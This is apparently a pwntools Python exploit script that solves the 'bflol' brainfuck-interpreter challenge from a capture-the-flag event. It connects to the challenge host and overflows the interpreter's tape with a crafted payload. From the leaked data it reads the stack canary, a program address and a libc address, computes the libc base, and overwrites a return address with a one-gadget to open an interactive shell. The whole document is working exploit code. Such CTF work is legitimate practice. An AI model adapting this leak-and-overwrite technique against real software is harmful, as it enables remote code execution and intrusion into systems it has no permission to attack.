#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
from pwn import *
context(arch = 'amd64', os = 'linux')
context.log_level = 'info'

#binary name
challenge_exe = './bflol'

#setting
con_host = 'chal.cybersecurityrumble.de'
con_port = 19783

p = connect(con_host, con_port)

command = ',[>,]>.[>.]>>.[>.]>><<<<<<<<,>,>,>,>,>,>'

p.sendline(command)

payload = ']'*30000
payload += command
payload += (1004-len(command))*']' + '\x00'


p.send(payload)

buff = p.recv(1)
buff += p.recv()

# we dump the canary (even if we don't need it)
canary = u64('\x00'+buff[0:7])
info("canary = "+hex(canary))
# we dump a program address (even if we don't need it)
leak1 = u64(buff[8:14]+'\x00\x00')
info("leak prog = "+hex(leak1))
# we dump a libc_start_main return address (this one we need it)
libc_leak = u64(buff[14:20]+'\x00\x00')
info("leak libc = "+hex(libc_leak))

# libc_start_main return address offset for libc_base
retoffset = 0x02409b
#Â we calculate libc_base with our libc leak
libc_base = libc_leak - retoffset
info("base libc = "+hex(libc_base))

# the one gadget we will use
onegadget = libc_base + 0x4484f

info("onegadget = "+hex(onegadget))
info("sending one gadget (good luck)")

payload2 = struct.pack('<Q', onegadget)
p.send(payload2[0:6])

p.interactive()
